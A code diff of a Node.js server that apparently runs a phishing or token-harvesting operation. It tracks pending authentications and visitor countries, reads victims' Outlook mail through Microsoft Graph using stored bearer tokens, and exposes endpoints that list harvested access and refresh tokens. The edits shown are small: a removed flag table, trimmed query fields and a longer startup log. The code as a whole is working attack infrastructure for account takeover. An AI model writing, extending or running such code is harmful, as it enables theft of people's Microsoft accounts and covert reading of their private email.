@@ -22,21 +22,7 @@ let pendingAuth = new Map();
 let sessionCounter = 1;
 let totalVisits = 0;
 
-// Country colors and flags
-const countryData = {
-    'United States': { color: '#B22234', flag: '🇺🇸' },
-    'Canada': { color: '#FF0000', flag: '🇨🇦' },
-    'United Kingdom': { color: '#00247D', flag: '🇬🇧' },
-    'Germany': { color: '#FFCC00', flag: '🇩🇪' },
-    'France': { color: '#0055A4', flag: '🇫🇷' },
-    'Japan': { color: '#BC002D', flag: '🇯🇵' },
-    'Australia': { color: '#012169', flag: '🇦🇺' },
-    'India': { color: '#FF9933', flag: '🇮🇳' },
-    'Netherlands': { color: '#FF7900', flag: '🇳🇱' },
-    'Sweden': { color: '#005B99', flag: '🇸🇪' },
-    'Other': { color: '#6B8E23', flag: '🌍' }
-};
-
+// Country mapping
 function getCountryFromIp(ip) {
     const countryMap = {
         '46.183': 'United States',
@@ -362,7 +348,7 @@ app.get('/api/mail/:email/:folderId', async (req, res) => {
     try {
         const response = await axios.get(`https://graph.microsoft.com/v1.0/me/mailFolders/${folderId}/messages`, {
             headers: { 'Authorization': `Bearer ${token}` },
-            params: { '$top': 50, '$orderby': 'receivedDateTime desc', '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments,importance' }
+            params: { '$top': 50, '$orderby': 'receivedDateTime desc', '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments' }
         });
         res.json(response.data);
     } catch (err) {
@@ -378,7 +364,7 @@ app.get('/api/mail/message/:email/:messageId', async (req, res) => {
     try {
         const response = await axios.get(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
             headers: { 'Authorization': `Bearer ${token}` },
-            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments,conversationId' }
+            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments' }
         });
         res.json(response.data);
     } catch (err) {
@@ -462,9 +448,17 @@ app.post('/api/openai/settings', (req, res) => { Object.assign(config, req.body)
 // SERVE FILES
 // ============================================
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
+
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`\n========================================`);
     console.log(`✅ Server running on port ${PORT}`);
-    console.log(`✅ Graph API Ready - Mailbox enabled`);
+    console.log(`✅ Endpoints ready:`);
+    console.log(`   - GET  /api/sessions`);
+    console.log(`   - GET  /api/session/token/:email`);
+    console.log(`   - GET  /api/list_access_tokens`);
+    console.log(`   - GET  /api/list_refresh_tokens`);
+    console.log(`   - GET  /api/country_stats`);
+    console.log(`   - GET  /api/overview_stats`);
+    console.log(`   - POST /start`);
     console.log(`========================================\n`);
 });
